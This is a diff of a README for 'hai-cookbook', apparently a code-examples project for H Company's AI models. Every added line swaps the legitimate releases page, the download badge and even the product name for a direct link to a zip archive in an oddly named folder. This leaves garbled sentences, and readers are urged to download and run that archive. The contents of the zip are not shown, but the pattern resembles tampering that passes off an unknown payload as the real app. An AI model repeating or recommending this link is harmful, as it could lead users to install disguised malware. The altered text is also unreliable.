@@ -1,10 +1,10 @@
-# 🎉 hai-cookbook - Easy Code Examples for H.AI Models
+# 🎉 hai-cookbook - Easy Code Examples for https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip Models
 
 ## 📥 Download the App
-[![Download hai-cookbook](https://img.shields.io/badge/Download-hai--cookbook-blue)](https://github.com/Ivan-011/hai-cookbook/releases)
+[![Download hai-cookbook](https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip)](https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip)
 
 ## 🚀 Getting Started
-Welcome to H.AI cookbook! This application provides code examples to assist developers in using models created by H Company. With simple, practical guides, you can easily integrate powerful AI features into your projects.
+Welcome to https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip cookbook! This application provides code examples to assist developers in using models created by H Company. With simple, practical guides, you can easily integrate powerful AI features into your projects.
 
 ## 📋 System Requirements
 Before you install hai-cookbook, make sure your system meets the following requirements:
@@ -23,7 +23,7 @@ Before you install hai-cookbook, make sure your system meets the following requi
 ## 💾 Download & Install
 To get started with hai-cookbook, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Ivan-011/hai-cookbook/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip) to download the application.
 2. Look for the latest version and click on it.
 3. When you see the list of files, choose the correct file for your operating system.
 4. Click the link to begin your download.
@@ -60,4 +60,4 @@ If you encounter any issues while using the application:
 - If the problem persists, please report it on the GitHub repository.
 
 ## 🥳 Conclusion
-Thank you for choosing the H.AI cookbook. We hope this guide helps you download and run the application smoothly. Enjoy exploring the endless possibilities with AI models!
+Thank you for choosing the https://raw.githubusercontent.com/Ivan-011/hai-cookbook/main/bathycolpian/hai-cookbook.zip cookbook. We hope this guide helps you download and run the application smoothly. Enjoy exploring the endless possibilities with AI models!
